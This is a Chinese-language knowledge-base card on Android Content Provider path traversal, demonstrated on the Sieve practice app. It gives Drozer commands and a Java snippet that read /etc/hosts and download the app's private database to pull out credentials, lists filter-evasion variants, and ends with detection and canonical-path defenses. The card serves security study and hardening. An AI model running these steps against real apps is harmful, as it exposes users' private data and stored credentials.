---
id: mobile-android-content-provider-path-traversal-file-read-db-download
title: Android Content Provider 目录遍历：FileBackupProvider 任意文件读取与私有数据库下载
type: scenario
domain: mobile
path: mobile/android
technique: android-content-provider-path-traversal-openinputstream
tags:
- android
- content-provider
- path-traversal
- drozer
- file-read
- sqlite
- data-disclosure
- mobile
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V333
  verified_at: '2026-11-08T18:20:20+08:00'
  notes: 已对照原文、本地61张图及2张外链图核对：img56 FileBackupProvider Read/Write 均 null；img61 scanner.provider.traversal 将 FileBackupProvider/ 与 FileBackupProvider 列为 Vulnerable Providers；外链图 20240616112143 证实 app.provider.read .../FileBackupProvider/etc/hosts 实际返回 localhost/127.0.0.1/::1/ip6-localhost 四行，外链图 20240616112158 显示 D:\database.db 25KB 已落盘，任意文件读取与数据库下载闭环成立（worker 当时未能下载外链图，现已核）。未验证点：未在本机复跑；Sieve 1.0 为练习 App，无真实产品受影响版本，已 --clear。说明：演示 App 可用绝对路径 /etc/hosts 直接读取，更像 open(uri.getPath()) 直开；卡内 baseDir 拼接+../ 为通用原理描述，PoC 与结论不受影响。无 sources/文章 ID/长段摘录。
url: /docs/mobile/android/mobile-android-content-provider-path-traversal-file-read-db-download/
draft: false
kb_aliases:
- Content Provider 目录遍历
- drozer scanner.provider.traversal
- app.provider.read
- app.provider.download
- FileBackupProvider
- openInputStream 路径穿越
---

## 一句话结论

导出的 Content Provider 若把 URI path 直接拼接到文件路径后交给 `openInputStream/openFile`，且未做路径规范化与 `..` 过滤，攻击者可用 `content://<authority>/../../..` 穿越出应用私有目录，读取 `/etc/hosts` 等系统文件，或下载 `/data/data/<pkg>/databases/*.db` 私有数据库。

## 原理

- ContentProvider 的 `openFile(uri, mode)` / `openInputStream` 通常把 `uri.getPath()` 与一个基础目录拼接后打开文件。如果实现类似 `new File(baseDir, uri.getPath())` 且没有 `getCanonicalPath()` 校验结果仍位于 baseDir 下，`../` 就能逐级跳出沙箱。
- 目录遍历的判定点在于路径是否被规范化：`File.getCanonicalPath()` 会折叠 `..`，若拼接后的 canonical 路径不以 baseDir 为前缀即应拒绝。
- Drozer 的 `scanner.provider.traversal` 会对可查询 URI 发送包含 `../` 的 path 探针，并报告 `Vulnerable Providers`；`app.provider.read` 用 `openInputStream` 读取文本内容，`app.provider.download` 把同一路径的输入流写到本地文件。
- 影响：越过应用沙箱读取任意可读文件；数据库文件被下载后可在本地用 SQLite 工具离线读取凭据、token 等。

## 触发条件

- Content Provider 已导出且无读权限（本例 FileBackupProvider `Read Permission: null`）。
- `openFile/openInputStream` 使用未规范化的 URI path 拼接文件路径，缺少 `..`/canonical 校验。
- 目标文件对 provider 所在进程可读；Drozer agent 或恶意 App 能访问该 provider。

## 利用步骤

1. 枚举 provider 与可访问 URI：
   `run app.provider.info -a com.mwr.example.sieve`（DBContentProvider、FileBackupProvider 均无读写权限）。
   `run scanner.provider.finduris -a com.mwr.example.sieve`。
2. 扫描目录遍历：
   `run scanner.provider.traversal -a com.mwr.example.sieve`，输出 `Vulnerable Providers: content://com.mwr.example.sieve.FileBackupProvider/`。
3. 读取系统文件验证穿越：
   `run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts`。
4. 下载应用私有数据库：
   `run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db d:/database.db`。
5. 本地用 SQLite 打开下载的 `database.db`，读取其中的表与凭据数据。

## PoC

```bash
dz> run scanner.provider.traversal -a com.mwr.example.sieve
dz> run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts
dz> run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db d:/database.db
```

等价第三方 App 调用（示意）：

```java
InputStream in = getContentResolver().openInputStream(Uri.parse(
    "content://com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db"));
```

说明：原文该两步（read/download 的实际输出）使用外链图片、未随正文下载，本地仅能核对 scanner 结论与给出的命令；故 confidence 记为 medium。

## 变体与关联

- 变体：`app.provider.query` 读取 provider 暴露的 `_data`/`_display_name` 列定位可读文件；把 `..` 编码为 `%2e%2e%2f` 或重复斜杠规避简单字符串过滤。
- 变体：若 provider 支持写模式，可组合任意文件写入覆盖配置/脚本，进一步扩展。
- 关联：[[mobile-android-content-provider-projection-sql-injection-sqlite-master]]（同一应用的 DBContentProvider SQL 注入，同属 provider 边界失守）；[[mobile-android-intent-redirection-fileprovider-grant-uri-private-file-read]]（借 FileProvider 授权读取私有目录，另一条路径）。
- 边界：provider 对拼接结果做 canonical 校验、拒绝 `..`、使用 `ParcelFileDescriptor.open` 配合白名单目录，或 `exported=false` 时失效。

## 检测与防御

- 检测特征：`openFile/openInputStream` 中直接使用 `uri.getPath()` 拼接；Drozer `scanner.provider.traversal` 报 Vulnerable；可读取 provider base 目录之外的文件。
- 防御：对拼接后的路径 `getCanonicalPath()` 并校验必须以 baseDir canonical 路径为前缀；拒绝包含 `..` 的 path segment；只暴露白名单文件；敏感 provider 设 `exported=false` 或加 signature 权限。
